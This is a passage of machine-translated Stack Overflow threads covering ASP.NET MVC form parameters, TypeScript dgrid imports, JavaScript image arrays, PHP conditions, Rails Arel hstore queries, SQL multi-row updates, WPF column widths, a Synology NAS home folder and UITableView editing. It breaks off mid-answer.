            CD_TRT
        </th>
        <th>
            LB_TRT
        </th>
        <th>
            PERIODE
        </th>
        <th>
            STATUT
        </th>
    </tr>
    @foreach (var item in Model)
    {
        <tr>
            <td>
                @item.CD_TRT
            </td>
            <td>
                @item.LB_TRT
            </td>
            <td>
                @item.PERIODE
            </td>
            <td>
                @if (item.STATUT == null)
                {
                    <img src="../../Content/Images/feu_croix.png" alt="Statut null" />
                }
                else if (item.STATUT == "KO")
                {
                    <a href="@Url.Action("PageLogs", new { Controller = "Suivi", CR = ViewData["CR"], Appli = ViewData["Appli"], TRT = item.CD_TRT, PERIODE = item.PERIODE })">
                        <img src="../../Content/Images/feu_rouge.png" alt="Statut KO" border="0" /></a>    
                }
                else if (item.STATUT == "OK")
                {
                    <a href="@Url.Action("PageLogs", new { Controller = "Suivi", CR = ViewData["CR"], Appli = ViewData["Appli"], TRT = item.CD_TRT, PERIODE = item.PERIODE })">
                        <img src="../../Content/Images/feu_vert.png" alt="Statut OK" border="0" /></a>                
                }
                else if (item.STATUT == "EN RETARD")
                {
                    <a href="@Url.Action("PageLogs", new { Controller = "Suivi", CR = ViewData["CR"], Appli = ViewData["Appli"], TRT = item.CD_TRT, PERIODE = item.PERIODE })">
                        <img src="../../Content/Images/feu_orange.png" alt="Statut en retard" border="0" /></a>                
                }
                else if (item.STATUT == "NON INITIE")
                {
                    <a href="@Url.Action("PageLogs", new { Controller = "Suivi", CR = ViewData["CR"], Appli = ViewData["Appli"], TRT = item.CD_TRT, PERIODE = item.PERIODE })">
                        <img src="../../Content/Images/feu_blanc.png" alt="Statut non initié" border="0" /></a>                
                }
                else if (item.STATUT == "EN COURS")
                {
                    <a href="@Url.Action("PageLogs", new { Controller = "Suivi", CR = ViewData["CR"], Appli = ViewData["Appli"], TRT = item.CD_TRT, PERIODE = item.PERIODE })">
                        <img src="../../Content/Images/feu_jaune.png" alt="Statut en cours" border="0" /></a>                
                }
            </td>
        </tr>
    }
</table> 
```

我希望我没有忘记任何东西。

你有什么建议来解决这个问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-15T14:36:56.307

是的，我在另一个论坛的某人的帮助下找到了解决方案。

这真的很简单，我唯一需要添加的是在 BeginForm 中，我必须添加这个：

```
@using (Html.BeginForm("PageDomaines", "Suivi", new { CR = @ViewData["CR"], Appli = @ViewData["Appli"] })) 
```

在 BeginForm 中，我按顺序有我的操作、我的控制器以及我想要传递给我的控制器的参数及其值。

在我的研究过程中，我认为这是一个解决方案，但我不知道如何编码。使用正确的语法，一切顺利。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T14:04:07.023

我将在这里回答只是因为空间限制:)。如果我理解正确，在索引页面上，左侧有表格，当您单击 ESPAS Centre-Est 时，它会打开一个新页面，右侧的表格列出 CE ESPAS。现在您在顶部有一个下拉菜单，当用户选择其中一个值时，VarCR 和 VarAppli 为空？（这里几乎是下班时间，所以如果我没有做对，我会把它归咎于累（:)

如果是这种情况，您需要向我们展示下拉菜单的代码，但在此之前，我认为您应该考虑通过单击表格或至少勾选复选框/按下来让用户做出选择按钮放置在每行的开头或结尾。当其他一切看起来都一样时，我不想让用户通过 2 种不同的方法进行选择，但这只是我。如果您从表中进行选择，您可以让 URL 包含 CE 和 Appli 的值，就像在第一个表中一样，如果您仍然想要下拉列表，您必须使用选择列表查看它，因为它可以帮助您有一个显示值和一个“支持”值，您可以在其中存储其他信息，例如 CE 和 Appli 值，您可以在此处查看：[http://msdn.microsoft.com/en-us/library/system.web.mvc.selectlist(v=vs.108).aspx](http://msdn.microsoft.com/en-us/library/system.web.mvc.selectlist(v=vs.108).aspx)

希望这能回答您的问题，如果不清楚，请告诉我，这在我的脑海中很清楚，但可能会变得混乱:)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-12T07:26:07.267

篇幅不够，就在这里回答吧。

是的，大概是这样，当用户在第一个表（左侧）中单击 ESPAS CE 的 STATUS 时，两个参数（CR 和 Appli，在这种情况下，CR = CE 和 Appli = ESPAS）被传递给我的控制器“SuiviController”的操作视图中的 URL 带有此链接： `<a href="@Url.Action("PageDomaines", new { Controller = "Suivi", CR = VarCR, Appli = VarAppli[j] })"> <img src="../../Content/Images/feu_rouge.png" alt="Statut OK" border="0" /></a>`

之后，我的操作获取了两个参数：CR 和 Appli，以便在 where 子句中使用此参数进行查询（查询在我的第一篇文章中）。我的查询结果返回到我的操作视图，并在第二页（右侧）上显示第二个表格，并带有下拉列表。另一件事，当用户在第二页时，URL 是这样的：

```
http://localhost:56672/Suivi/PageDomaines?CR=CE%20%20%20%20%20%20%20%20&Appli=ESPAS 
```

但是当用户在下拉列表中选择一个值时，页面被刷新并且我丢失了我的参数，url变成了这个：

```
http://localhost:56672/Suivi/PageDomaines 
```

当我在下拉列表中选择一个值时，我丢失了从第一页传递的参数，我不知道如何保留它们......

下拉列表的代码显示在第一篇文章中，但这里是：

```
 @using (Html.BeginForm("PageDomaines", "Suivi"))
{
    @Html.DropDownList("DDL", new SelectList(new[] { "MMCR", "MMCL", "MMCO", "MMSE", "MMAS" }), "--Select one--", new { onchange = "this.form.submit();" })
} 
```

我清楚了吗？

* * *

对于您第二段中提到的点，我不想给用户这样的选择，对于我的问题，我使用了一个带有简单选择的下拉列表，只是为了在第二个表中显示所有行CD_TRT 等于所选值，所以如果我选择 MMCL，将显示以下行：MMCL / Client - DMCL / 20121001 / Status。但这不是我最终会得到的下拉列表。最终的下拉列表将是一个列表，用户可以在其中根据以下格式选择在日期函数中执行的作业：2012 年 1 月、2012 年 2 月……或其他应用程序（例如 BO）2012 年 1 月 25 日， 2012 年 1 月 26 日等... 将选择的值将取决于在第一页上选择的应用程序。

我想就是这样，如果您有任何疑问，请告诉我 :)

真的，感谢您的帮助。

# typescript - 导入语法以从 TypeScript 引用 dgrid

> ID：12839823
> 
> 赞同：1
> 
> 时间：2012-10-11T12:43:36.180
> 
> 标签：typescript, js-amd, dgrid

我正在并行学习 TypeScript 和 Dojo，这暴露了我对 AMD 的有限理解。我不明白如何将导入语句与第 3 方“dgrid/Grid”AMD 模块、我的 dgrid.d.ts 存根声明和我的消费类联系在一起。经过 2 天的浪费努力，我正在寻找任何方法（hacky 或 amd 最佳实践）来执行以下操作：

**我的模块.ts**

```
{
    ...
    var myGrid = new dgrid.Grid( { /*col structure*/}, "divId");
    ...
} 
```

这是我的 dgrid 存根声明文件。

**dgrid.d.ts**（编辑为与下面的更新 1 同步）

```
module "dgrid/Grid"
{
    export class Grid
    {
        constructor ( gridStructure: any, elementId: string);
    }
} 
```

我在使用 TypeScript 类中尝试了以下引用，但 Visual Studio 用红色强调了“dgrid/Grid”文字，因为我猜 TS 编译器不知道 default.htm 文件中的经典 Dojo dojoConfig、baseUrl 和 dgrid 包声明。

```
///<reference path='dgrid.d.ts' />

import Grid = module("dgrid/Grid");

module MyModule
{
   ...
} 
```

**更新 1** 自发布以来，我通读了官方 TypeScript 手册中的第 10 章。以前我未能认识到声明为模块 MyType{} 或模块“外部/第三方”{} 的模块的重要性。外部模块的环境声明应该是文字。

**背景：**

*   我正在使用从 ajax.googleapis.com 引用的 Dojo 1.8.0
*   dgrid JavaScript 本地托管在 /js/dgrid
*   我正在尝试密切关注 SitePen dgrid 教程页面，该页面显示了经典的 AMD require() 加载 dgrid [http://dojofoundation.org/packages/dgrid/tutorials/hello_dgrid](http://dojofoundation.org/packages/dgrid/tutorials/hello_dgrid) [http://dojofoundation.org/packages/dgrid/tutorials/hello_dgrid /demo/simple.html](http://dojofoundation.org/packages/dgrid/tutorials/hello_dgrid/demo/simple.html)

要求声明：

```
require(["dgrid/Grid", "dojo/domReady!"],
    function(Grid){ 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T14:45:18.347

您的代码的以下（略有更改）版本对我来说编译得很好：

**我的模块.ts**

```
///<reference path='./dgrid.d.ts' />
module MyModule {
    var gridInstance : dgrid.Grid = new dgrid.Grid("test1", "test2");
} 
```

**dgrid.d.ts**

```
module dgrid
{
    class Grid
    {   
        constructor ( gridStructure: any, elementId: string);
    }   

} 
```

该`///<reference path='...'/>`构造将*内部*模块`dgrid`带入范围。使用模块名称作为类型名称的前缀可以完成这项工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T13:52:32.690

我的第一个想法是检查文件是否位于您认为该语句起作用的位置：

```
///<reference path='dgrid.d.ts' /> 
```

该文件是否`dgrid.d.ts`与您的模块 .ts 文件位于同一文件夹中？

**更新：**

如果你的模块声明是：

```
module dgrid {
    export class Grid {
        constructor ( gridStructure: any, elementId: string) {

        }
    }
} 
```

# javascript - 如何增加 Javascript 变量名

> ID：12839827
> 
> 赞同：1
> 
> 时间：2012-10-11T12:43:43.053
> 
> 标签：javascript, variables, loops, increment

我刚刚学会了在我的 ebay + 网站列表中生成缩略图所需的最低限度。基本上，我在一个列表中最多有 12 张图片，并且为了在创建新列表时不必为每张图片写出 URL，我已将其设置为只需要编写一次文件名（变量“picname ") 和图片数量（变量“picnum”），剩下的由 javascript 完成。它工作正常，但似乎很啰嗦。

如何缩短/优化代码？我确信某种循环可以解决问题，但是在花了一整天的时间搜索和大量试验和错误之后，我就是想不通。

我想将以下代码块缩短/优化为循环：

```
imagenum=1;
if (imagenum <= picnum) {image1 = new Image(); image1.src = "http://www.20thcenturyglass.com/auctions/2012/"+picname+" ("+imagenum+").jpg"; thumb1 = new Image(); thumb1.src = "http://www.20thcenturyglass.com/thumbs/2012/"+picname+" ("+imagenum+").jpg";imagenum++;}
if (imagenum <= picnum) {image2 = new Image(); image2.src = "http://www.20thcenturyglass.com/auctions/2012/"+picname+" ("+imagenum+").jpg"; thumb2 = new Image(); thumb2.src = "http://www.20thcenturyglass.com/thumbs/2012/"+picname+" ("+imagenum+").jpg";imagenum++;}
if (imagenum <= picnum) {image3 = new Image(); image3.src = "http://www.20thcenturyglass.com/auctions/2012/"+picname+" ("+imagenum+").jpg"; thumb3 = new Image(); thumb3.src = "http://www.20thcenturyglass.com/thumbs/2012/"+picname+" ("+imagenum+").jpg";;imagenum++;}
if (imagenum <= picnum) {image4 = new Image(); image4.src = "http://www.20thcenturyglass.com/auctions/2012/"+picname+" ("+imagenum+").jpg"; thumb4 = new Image(); thumb4.src = "http://www.20thcenturyglass.com/thumbs/2012/"+picname+" ("+imagenum+").jpg";imagenum++;}
if (imagenum <= picnum) {image5 = new Image(); image5.src = "http://www.20thcenturyglass.com/auctions/2012/"+picname+" ("+imagenum+").jpg"; thumb5 = new Image(); thumb5.src = "http://www.20thcenturyglass.com/thumbs/2012/"+picname+" ("+imagenum+").jpg";imagenum++;}
if (imagenum <= picnum) {image6 = new Image(); image6.src = "http://www.20thcenturyglass.com/auctions/2012/"+picname+" ("+imagenum+").jpg"; thumb6 = new Image(); thumb6.src = "http://www.20thcenturyglass.com/thumbs/2012/"+picname+" ("+imagenum+").jpg";imagenum++;}
if (imagenum <= picnum) {image7 = new Image(); image7.src = "http://www.20thcenturyglass.com/auctions/2012/"+picname+" ("+imagenum+").jpg"; thumb7 = new Image(); thumb7.src = "http://www.20thcenturyglass.com/thumbs/2012/"+picname+" ("+imagenum+").jpg";imagenum++;}
if (imagenum <= picnum) {image8 = new Image(); image8.src = "http://www.20thcenturyglass.com/auctions/2012/"+picname+" ("+imagenum+").jpg"; thumb8 = new Image(); thumb8.src = "http://www.20thcenturyglass.com/thumbs/2012/"+picname+" ("+imagenum+").jpg";imagenum++;}
if (imagenum <= picnum) {image9 = new Image(); image9.src = "http://www.20thcenturyglass.com/auctions/2012/"+picname+" ("+imagenum+").jpg"; thumb9 = new Image(); thumb9.src = "http://www.20thcenturyglass.com/thumbs/2012/"+picname+" ("+imagenum+").jpg";imagenum++;}
if (imagenum <= picnum) {image10 = new Image(); image10.src = "http://www.20thcenturyglass.com/auctions/2012/"+picname+" ("+imagenum+").jpg"; thumb10 = new Image(); thumb10.src = "http://www.20thcenturyglass.com/thumbs/2012/"+picname+" ("+imagenum+").jpg";imagenum++;}
if (imagenum <= picnum) {image11 = new Image(); image11.src = "http://www.20thcenturyglass.com/auctions/2012/"+picname+" ("+imagenum+").jpg"; thumb11 = new Image(); thumb11.src = "http://www.20thcenturyglass.com/thumbs/2012/"+picname+" ("+imagenum+").jpg";imagenum++;}
if (imagenum <= picnum) {image12 = new Image(); image12.src = "http://www.20thcenturyglass.com/auctions/2012/"+picname+" ("+imagenum+").jpg"; thumb12 = new Image(); thumb12.src = "http://www.20thcenturyglass.com/thumbs/2012/"+picname+" ("+imagenum+").jpg";imagenum++;} 
```

我假设我需要以下内容：

```
for (imagenum=1; imagenum<picnum; imagenum++) {image(imagenum) = new Image(); image(imagenum).src = "http://www.20thcenturyglass.com/auctions/2012/"+picname+" ("+imagenum+").jpg"; thumb(imagenum) = new Image(); thumb(imagenum).src = "http://www.20thcenturyglass.com/thumbs/2012/"+picname+" ("+imagenum+").jpg";} 
```

但是我显然有语法错误，因为那不起作用。我不知道如何使变量名随着循环的每个循环而递增，非常感谢一些帮助！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-11T12:48:20.400

使用数组。像这样的东西：

```
var images = [];
for (var i = 0; i < picnum; i++)
{
    images[i] = {
        Image: new Image(),
        Thumb: new Image()
    };

    images[i].Image.src = ...;
    images[i].Thumb.src = ...;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-11T12:48:50.897

您应该为此类任务使用[数组](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array)。因此，按照上面的代码可能会起作用：

```
// create the array
var images = [], thumbs = [];

// loop through all images
for ( var imagenum=1; imagenum<picnum; imagenum++) {
  images[imagenum] = new Image(); 
  images[imagenum].src = "http://www.20thcenturyglass.com/auctions/2012/"+picname+" ("+imagenum+").jpg"; 
  thumbs[imagenum] = new Image(); 
  thumbs[imagenum].src = "http://www.20thcenturyglass.com/thumbs/2012/"+picname+" ("+imagenum+").jpg";
} 
```

`images[1]`然后，您可以通过 和 访问所有图像和相应的缩略图`thumbs[1]`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T12:48:44.877

您需要使用方括号来引用数组。

```
var myImages = [];
for (var i=1; i<10; i++) {
    var newImg = new Image();
    newImage.src = "foo.gif";
    myImages[i] = newImage;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-11T12:52:59.330

您可以拥有一个包含 12 个不同对象的数组，而不是 12 个不同的变量。那么你的代码应该是这样的：

```
var imgArray = [];
var thumbArray = [];
for (var i = 0; i < 12; i++) {
    var img = new Image();
    img.src = "http://www.20thcenturyglass.com/auctions/2012/"+picname+" ("+i+").jpg";
    imgArray.push(img);
    var tmb = new Image();
    tmb.src = "http://www.20thcenturyglass.com/thumbs/2012/"+picname+" ("+i+").jpg";
    thumbArray.push(tmb);
} 
```

PS：代码未经测试可以正常工作，但它应该可以工作......

# php - 逻辑运算符 PHP 变量等于 A 或 B 或 C，它不会评估为其中任何一个

> ID：12839829
> 
> 赞同：1
> 
> 时间：2012-10-11T12:43:55.247
> 
> 标签：php, arrays, ftp, logical-operators

我目前正在使用 ftp_rawlist 输出每个文件和文件夹，包括远程站点根目录中的子文件夹。数组中文件的输出包括权限、用户等

例如来自 var_Dump

```
string(68) "-rw-r--r--    1 XXXX   XXXX         1754 Sep 13 12:13 run.js" 
```

我在 foreach 循环中遍历文件和文件夹数组，我抓住最后一次出现的空格，使用 strrchr 函数隔离文件和文件夹名称。然后我修剪空白，最后使用 if 语句

```
 <?php     
      if($newfilename != ".." || $newfilename != "."   $newfilename != "")  {

         echo $newfilename."</br>";
         var_dump($newfilename);
     }
     ?> 
```

我希望它输出数组中不包含“..”或“.”的文件和文件夹。"" 但它仍然输出。请问有什么帮助吗？

```
 array(".", "..", "name.txt") 
```

只输出

名称.txt

代替

., .., 名称.txt

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-11T12:45:49.983

您的条件应该是`&&`，而不是`||`：

```
if ($newfilename != ".." && $newfilename != "."  && $newfilename != "")  {
    // file name is not '..', '.' or ''
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T12:57:38.350

尝试

```
if(($newfilename != "..") && ($newfilename != ".") && ($newfilename != ""))  {
    // 
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-10-23T13:54:40.613

更短：

```
if(!in_array($newfilename,["..",".",""]))  { 
```

更短且绝对脏

```
!in_array($newfilename,["..",".",""]) && !echo $newfilename."</br>" &&  var_dump($newfilename); 
```

（echo 不返回任何值，所以否定 null 为真，因此执行 var_dump）

# ruby-on-rails - 将 postgres hstore sql 转换为 Arel

> ID：12839834
> 
> 赞同：3
> 
> 时间：2012-10-11T12:44:05.070
> 
> 标签：ruby-on-rails, arel, hstore

我`hstore`在`users`表中有一个名为`properties`.

如何将 where 条件中的静态 sql 字符串转换为 aRel 语法？

```
User.where("properties -> 'is_robber' = 'true'") #=> ...some users 
```

我试过了：

```
ut = User.arel_table
condition = ut["properties -> 'is_robber'"].eq('true')
User.where(condition) #=> throws pg error 
```

这会产生错误的sql：

```
 SELECT "users".* FROM "users" WHERE "users"."properties -> 'is_robber'" = 'true' 
```

与我需要的相比：

```
SELECT "users".* FROM "users" WHERE "users".properties -> 'is_robber' = 'true' 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-11-27T09:04:10.510

您可以通过创建自己的 Arel::Nodes::InfixOperation 来使用 Arel 完成此操作：

```
ut = Arel::Table.new(:user)
hstore_key = Arel::Nodes::InfixOperation.new("->", ut[:properties], 'is_robber')
User.where(hstore_key.eq('true')) 
```

将产生：

```
SELECT "users".* FROM "users" WHERE "users"."properties" -> 'is_robber' = 'true' 
```

如果您从未听说过中缀表示法，[维基百科给出了很好的解释](http://en.wikipedia.org/wiki/Infix_notation)：

> 中缀表示法是常见的算术和逻辑公式表示法，其中运算符在它们作用的操作数之间以中缀样式编写（例如 2 + 2）。计算机解析它不像前缀表示法（例如 + 2 2 ）或后缀表示法（例如 2 2 + ）那么简单，但是由于它的熟悉性，许多编程语言都使用它。

不幸的是，没有太多关于 Arel 的文档，也没有关于 InfixOperation 节点的文档，因此一开始可能会令人沮丧。当您在寻找如何使用 Arel 执行特定 SQL 操作时，最好的办法是查看[源代码中的节点目录](https://github.com/rails/arel/tree/master/lib/arel/nodes)。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-10-11T13:29:54.277

如果您使用[activerecord-postgres-hstore](https://github.com/softa/activerecord-postgres-hstore) gem，您将能够：

```
class User < ActiveRecord::Base
  serialize :data, ActiveRecord::Coders::Hstore
end

User.where("data -> 'speed' = 'ludicrous'") 
```

更多信息：
* [https://github.com/softa/activerecord-postgres-hstore](https://github.com/softa/activerecord-postgres-hstore)
* [http://railscasts.com/episodes/345-hstore](http://railscasts.com/episodes/345-hstore)

RailsCast Pro 集有关于自动创建范围、getter 和 setter 的优秀示例代码。

# sql - 如何使用唯一值更新表中的列，但不是所有行，不递增

> ID：12839835
> 
> 赞同：2
> 
> 时间：2012-10-11T12:44:04.883
> 
> 标签：sql

> **可能重复：**
> [是否可以使用单个 UPDATE SQL 语句执行多个更新？](https://stackoverflow.com/questions/412101/is-it-possible-to-perform-multiple-updates-with-a-single-update-sql-statement)

我正在使用特定列的一些新值更新表，如下所示，因此我正在更新表 Prepay，列 PrepayTransactionDesc，在 prepayId 指示的某些流上

```
update Prepay
set PrepayTransactionDesc = 'Funded Repeat Voucher 153429'
where prepayId = 58045 
```

它工作正常，但我想做多次更新。我尝试了几种不同的方法，但都失败了。我当时试图这样做是在使用 CASE 的时候。

例如，我有以下 prepayid 和 prepaytransactiondesc 字段

```
57770   Funded Repeat Voucher 153118
57771   Funded Repeat Voucher 153119
57772   Funded Repeat Voucher 153120
57773   Funded Repeat Voucher 153121
57774   Funded Repeat Voucher 153122
57775   Funded Repeat Voucher 153123
57776   Funded Repeat Voucher 153124
57894   Funded Repeat Voucher 153276
57895   Funded Repeat Voucher 153277
57896   Funded Repeat Voucher 153278 
```

我将如何在 1 内完成它们？这不可能那么困难，但是当我尝试完成这项任务时，我似乎遗漏了一些东西。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:46:58.620

你可以试试

```
UPDATE Prepay
SET PrepayTransactionDesc = 
   CASE
     WHEN prepayID = 57770 THEN 'Funded Repeat Voucher 153118'
     WHEN prepayID = 57771 THEN 'Funded Repeat Voucher 153119'
     WHEN prepayID = nextID THEN 'Next Value' 
   END
WHERE  prepayID in (1,2,4,57770... all your ids here) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T12:54:27.333

将要更新的数据放入临时变量表​​中。然后在更新语句的 FROM 子句中将它与要更新的表连接起来。这将允许您在一个语句中更新多行。

```
DECLARE @data TABLE (id INT, desc VARCHAR(200))
INSERT @data VALUES (57770, 'Funded Repeat Voucher 153118')
INSERT @data VALUES (57771, 'Funded Repeat Voucher 153119')

UPDATE Prepay
SET PrepayTransactionDesc = @data.desc
FROM Prepay
    INNER JOIN @data ON Prepay.prepayID = @data.id 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T12:55:05.850

```
update Prepay
  set PrepayTransactionDesc = 
    case
      when prepayId = 58045 then 'Funded Repeat Voucher 153429'
      when prepayId = 57770 then 'Funded Repeat Voucher 153118'
    end
where
  prepayId in (58045 , 57770) 
```

显然添加其他值

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-11T12:56:06.317

```
Update Prepay SET PrepayTransactionDesc = 'Funded Repeat Voucher 153429' WHERE  prepayID  BETWEEN yourid AND yourid 
```

# wpf - GridviewColumn 宽度仅针对第一个条目进行调整；当设置为自动 - WPF

> ID：12839837
> 
> 赞同：0
> 
> 时间：2012-10-11T12:44:10.770
> 
> 标签：wpf, listview, width, gridviewcolumn

我正在尝试实现以下目标
1\. 将 gridview 列的最小宽度设置为某个值。
2\. 当条目添加到该列时，列宽应相应调整。
我已经为它编写了以下代码

```
<Grid Background="white" Height="140" Width="auto">
            <ListView Style="{StaticResource stl_lvi_TEXT}" Grid.Row="0" Grid.Column='0' Name="lv_includedInstruments" SelectionMode="Single" Background="White" Height="140" Width="auto" HorizontalAlignment ="Stretch"  VerticalAlignment="Stretch" ItemsSource="{Binding Coll_History}" ScrollViewer.VerticalScrollBarVisibility="Auto" SelectionChanged="lv_includedInstruments_SelectionChanged" TabIndex="18" GotFocus="lv_includedInstruments_GotFocus">
                <ListView.View>
                    <GridView>
                        <GridViewColumn Width="212"  >
                            <GridViewColumn.Header>
                                <GridViewColumnHeader Style="{StaticResource stl_ColumnHeaderStyle}" Content="Groups" HorizontalContentAlignment="Left" Background="white" FontSize="12" BorderBrush="#FF97BADA" BorderThickness="1" Tag="ProtocolVisitTypeForm.ProtocolName"/>
                            </GridViewColumn.Header>
                            <GridViewColumn.CellTemplate>
                                <DataTemplate>
                                    <TextBlock Width="auto" Tag="{Binding}" Text="{Binding Path=ProtocolVisitTypeForm.ProtocolName}" >
                                    </TextBlock>
                                </DataTemplate>
                            </GridViewColumn.CellTemplate>
                        </GridViewColumn>

                    </GridView>
                </ListView.View>
            </ListView>
        </Grid> 
```

stl_ColumnHeaderStyle 如下

```
<Style x:Key="stl_ColumnHeaderStyle" TargetType="{x:Type GridViewColumnHeader}">
    <Setter Property="ContentTemplate">
        <Setter.Value>
            <DataTemplate>
                <TextBlock MinWidth="200" Width="auto" TextWrapping="Wrap" Text="{Binding}"></TextBlock>
            </DataTemplate>
        </Setter.Value>
    </Setter>
</Style> 
```

当我添加长度为 x 的字符串的第一个条目时，这工作正常。但如果后续条目的长度大于 x，则列宽不会扩大。
谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T13:53:20.003

您已经明确设置了 gridVIewColumn 宽度。它永远不会增长超过 212。将 GridViewColumn.Width 与 GridViewColumn.Header.ActualWidth 绑定。那么它应该是动态的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T13:07:03.127

***编辑：***如果您的 Coll_History 是可观察的（我猜是因为您绑定了它），您可以执行以下操作：

*   将您想要的最小宽度设置为 GridViewColumn 宽度（在您的情况下为 212）
*   如果不需要，请从标题数据模板中删除 minWidth

**在您的 xaml**中：将处理程序添加到 ListView 控件的 Loaded 事件：

```
<ListView Loaded="lv_includedInstruments_Loaded" ... > ... </ListView> 
```

**在后面的代码中**：

```
private void lv_includedInstruments_Loaded(object sender, RoutedEventArgs e)
{
    ((sender as ListView).Items as INotifyCollectionChanged).CollectionChanged += ListViewItemsCollectionChanged;
}

void ListViewItemsCollectionChanged(object sender, NotifyCollectionChangedEventArgs e)
{
    var oldItems = e.OldItems;
    var newItems = e.NewItems;
    if ((oldItems == null || oldItems.Count == 0) && (newItems != null && newItems.Count > 0))
        gridViewColumn.Width = double.NaN;
} 
```

# ssh - 更改 Synology NAS 中的默认文件夹

> ID：12839849
> 
> 赞同：1
> 
> 时间：2012-10-11T12:44:43.427
> 
> 标签：ssh, nas

我有一台 Synology DS212+，当我通过 ssh 使用 root putty 登录时，我总是进入文件夹 /root。

我该如何改变呢？我想在 /volume1 中默认输入。是否有可能做到这一点？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-05T03:39:36.263

去编辑 /etc/passwd 并更改 root 的主目录。改变

```
root:x:0:0:root:/root:/bin/ash 
```

到

```
root:x:0:0:root:/volume1:/bin/ash 
```

# ios - UITableView 需要看起来像带有就地编辑字段的联系人

> ID：12839850
> 
> 赞同：3
> 
> 时间：2012-10-11T12:44:50.577
> 
> 标签：ios, iphone, uitableview, ios6

我有一个 UITableView，我想以与联系人应用程序类似的方式工作，因为有一个编辑按钮，单击该按钮可将单元格转换为编辑单元格。

目前它们是使用单元格样式“左细节”设置的，我已经覆盖了 setEditing 方法以准备实施，但我不知道如何转换单元格。

此处的其他一些答案包括“在表格视图的编辑属性更改时（按下编辑按钮时）进行监控。然后在表格视图处于编辑状态时，将代码添加到您的委托方法中以不同的方式组合、绘制和缩进单元格模式。” 这正是我想要的，但不知道该怎么做。

```
- (void)setEditing:(BOOL)flag animated:(BOOL)animated
{
    [super setEditing:flag animated:NO];
    if (flag == YES){
        // Change views to edit mode.
        self.textField = [[UITextField alloc] initWithFrame:[_titleLabel frame]];
        [self.textField setText:_titleLabel.text];
        [self.view addSubview:self.textField];           
    }
    else {
        // Save the changes if needed and change the views to noneditable.
        [_titleLabel setText:self.textField.text];
        [self.textField removeFromSuperview];
    }
} 
```

在我的方法中，我的代码取自[另一个](https://stackoverflow.com/questions/8207230/unable-to-generate-uitextfield-dynamically-in-place-of-uilabel)有效的问题.. 有点（它在错误的位置动态创建了一个新的可编辑文本字段并且不隐藏标签）。 ![编辑前](../Images/1e10f88a73a51a4c8f182831832069f0.png) ![编辑期间](../Images/1aebcf48fc5489e7fe26c183970d6afc.png) ![编辑后](../Images/d2e6eea4a00dc97a80043291028c23be.png)

[苹果指南](http://developer.apple.com/library/ios/#featuredarticles/ViewControllerPGforiPhoneOS/EnablingEditModeinaViewController/EnablingEditModeinaViewController.html)不够具体，我无法理解如何开发视图。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T13:02:59.180

简而言之，它的工作方式是在整体上设置一个编辑标志`UITableView`，然后实现在`UITableViewDataSource`协议中声明的几个方法（canEditRowAtIndexPath，commitEditingStyle），以确定正在编辑哪些单元格。

因此，首先您需要将 UITableVIew 置于编辑模式。您想在工具栏按钮的处理程序中执行此操作：

`[self.tableView setIsEditing:YES animated:NO];`

然后，tableview 将调用`canEditRowAtIndexPath`以确定是否可以编辑该行：

```
- (BOOL)tableView:(UITableView *)tableView canEditRowAtIndexPath:(NSIndexPath *)indexPath 
```

最后，当用户完成编辑时，会调用此方法：

```
- (void)tableView:(UITableView *)tableView commitEditingStyle:(UITableViewCellEditingStyle)editingStyle forRowAtIndexPath:(NSIndexPath *)indexPath 
```

[http://developer.apple.com/library/ios/#documentation/uikit/reference/UITableViewDataSource_Protocol/Reference/Reference.html](http://developer.apple.com/library/ios/#documentation/uikit/reference/UITableViewDataSource_Protocol/Reference/Reference.html)

这里还有另一个例子：

[http://www.behindtechlines.com/2012/06/02/enabling-configuring-uitableview-edit-mode/](http://www.behindtechlines.com/2012/06/02/enabling-configuring-uitableview-edit-mode/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T13:54:54.917

我有一个解决方法。

如果我创建一个自定义行并使其看起来与“左侧详细信息”样式相同，但使用右侧的文本视图而不是标签，我可以更改视图的“seteditable”和“setenabled”字段，以便编辑他们允许编辑。我已经修改了字体颜色，因此在单击编辑时它会发生变化，因此用户可以看到它现在是可编辑的。

这似乎很混乱 - 所以我仍在寻找最好的方法来做到这一点。

```
- (void)setEditing:(BOOL)flag animated:(BOOL)animated
{
    [super setEditing:flag animated:NO];
    if (flag == YES){        
        [self.tableView setEditing:YES animated:NO];
        [self.sampleLabel setEnabled:YES];
        [self.sampleLabel setTextColor:[UIColor blackColor]];
    }
    else {
        [self.sampleLabel setEnabled:NO];
        [self.sampleLabel setTextColor:[UIColor darkGrayColor]];
    }
}

- (void)configureView
{
    self.titleLabel.text = [[self.detailItem valueForKey:@"title"] description];
    self.ticketNumberLabel.text = [[self.detailItem valueForKey:@"reference"] description];
    self.detailsLabel .text = [[self.detailItem valueForKey:@"details"] description];
    self.sampleLabel.text = [[self.detailItem valueForKey:@"reference"] description];

    // initially set labels to not be editable
    [self.detailsLabel setEditable:NO];
    [self.sampleLabel setEnabled:NO];

}

- (BOOL)tableView:(UITableView *)tableView canEditRowAtIndexPath:(NSIndexPath *)indexPath
{
    // Return NO if you do not want the specified item to be editable.
